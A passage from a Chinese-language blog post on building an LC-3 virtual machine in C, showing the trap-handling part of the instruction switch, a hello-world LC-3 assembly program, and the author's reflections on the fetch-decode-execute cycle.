OP_ST: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="type">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1ff</span>, <span class="number">9</span>);</span><br><span class="line">            mem_write(reg[R_PC] + pc_offset, reg[r0]);</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_STI: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="type">uint16_t</span> pc_offset = sign_extend(instr &amp; <span class="number">0x1ff</span>, <span class="number">9</span>);</span><br><span class="line">            mem_write(mem_read(reg[R_PC] + pc_offset), reg[r0]);</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_STR: &#123;</span><br><span class="line">            <span class="type">uint16_t</span> r0 = (instr &gt;&gt; <span class="number">9</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="type">uint16_t</span> r1 = (instr &gt;&gt; <span class="number">6</span>) &amp; <span class="number">0x7</span>;</span><br><span class="line">            <span class="type">uint16_t</span> offset = sign_extend(instr &amp; <span class="number">0x3F</span>, <span class="number">6</span>);</span><br><span class="line">            mem_write(reg[r1] + offset, reg[r0]);</span><br><span class="line">        &#125; <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_TRAP:</span><br><span class="line">            reg[R_R7] = reg[R_PC];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (instr &amp; <span class="number">0xFF</span>)</span><br><span class="line">            &#123;</span><br><span class="line">            <span class="keyword">case</span> TRAP_GETC:</span><br><span class="line">            &#123;</span><br><span class="line">                reg[R_R0] = (<span class="type">uint16_t</span>)getchar();</span><br><span class="line">                update_flags(R_R0); </span><br><span class="line">            &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TRAP_OUT:</span><br><span class="line">            &#123;</span><br><span class="line">                putc((<span class="type">char</span>)reg[R_R0], <span class="built_in">stdout</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TRAP_PUTS:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/* one char per word */</span></span><br><span class="line">                <span class="type">uint16_t</span>* c = memory + reg[R_R0];</span><br><span class="line">                <span class="keyword">while</span> (*c)</span><br><span class="line">                &#123;</span><br><span class="line">                    putc((<span class="type">char</span>)*c, <span class="built_in">stdout</span>);</span><br><span class="line">                    ++c;</span><br><span class="line">                &#125;</span><br><span class="line">                fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TRAP_IN:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Enter a character: &quot;</span>);</span><br><span class="line">                <span class="type">char</span> c = getchar();</span><br><span class="line">                putc(c, <span class="built_in">stdout</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>);</span><br><span class="line">                reg[R_R0] = (<span class="type">uint16_t</span>)c;</span><br><span class="line">                update_flags(R_R0);</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TRAP_PUTSP:</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">/* one char per byte (two bytes per word)</span></span><br><span class="line"><span class="comment">                   here we need to swap back to</span></span><br><span class="line"><span class="comment">                   big endian format */</span></span><br><span class="line">                <span class="type">uint16_t</span>* c = memory + reg[R_R0];</span><br><span class="line">                <span class="keyword">while</span> (*c)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">char</span> char1 = (*c) &amp; <span class="number">0xFF</span>;</span><br><span class="line">                    putc(char1, <span class="built_in">stdout</span>);</span><br><span class="line">                    <span class="type">char</span> char2 = (*c) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">                    <span class="keyword">if</span> (char2) putc(char2, <span class="built_in">stdout</span>);</span><br><span class="line">                    ++c;</span><br><span class="line">                &#125;</span><br><span class="line">                fflush(<span class="built_in">stdout</span>);</span><br><span class="line">            &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> TRAP_HALT:</span><br><span class="line">                <span class="built_in">puts</span>(<span class="string">&quot;HALT&quot;</span>);</span><br><span class="line">                fflush(<span class="built_in">stdout</span>);</span><br><span class="line">                running = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> OP_RES:</span><br><span class="line">        <span class="keyword">case</span> OP_RTI:</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="built_in">abort</span>();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    restore_input_buffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230520140311.png"></p>
<p>其实整个虚拟机跟着做完人还处于一种比较懵逼的状态，我写了个虚拟机是干啥的？？？？实操了一下，这个虚拟机和我一开始接触的VMware不一样，这更像是一个翻译机器，我们可以用lc-3的汇编语言编写程序，然后用汇编器生成二进制文件，我们编写的这个程序就可以执行这个二进制文件。比如我们编写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.ORIG X3000 ;.ORIG是伪操作符</span><br><span class="line">LEA R0,string     </span><br><span class="line">PUTS</span><br><span class="line">HALT</span><br><span class="line">string .STRINGZ &quot;Hello,word!&quot;</span><br><span class="line">.END</span><br></pre></td></tr></table></figure>

<p>这个汇编程序可以实现将hello word打印在屏幕上。具体的实现步骤</p>
<p>1.首先在模拟器中用汇编语言编写</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230520145408.png"></p>
<p>2.将其保存为.asm文件</p>
<p>3.点击asm创建.obj文件</p>
<p>然后我们就可以通过 .&#x2F;LC-3\ VM.exe hello.obj来实现</p>
<p><img src="/2023/05/21/%E7%BC%96%E5%86%99%E8%99%9A%E6%8B%9F%E6%9C%BA/QQ%E6%88%AA%E5%9B%BE20230520145639.png"></p>
<p>工作流程：</p>
<ol>
<li>读取镜像文件,加载到内存</li>
<li>PC寄存器设置为0x3000,指向第一条指令</li>
<li>重复取指-译码-执行</li>
<li>遇到HALT指令后,退出模拟,程序结束。</li>
</ol>
<p>将二进制(机器码)翻译成高级语言，我们可以再套一层虚拟机，将我们的c语言转变成这个汇编。通过这次虚拟机的实现过程，对计算机行为有了更进一步的了解。</p>
<p><a href="https://www.jmeiners.com/lc3-vm/"><a href="https://www.jmeiners.com/lc3-vm/">Write your Own Virtual Machine (jmeiners.com)</a></a></p>
]]></content>
  </entry>
</search>
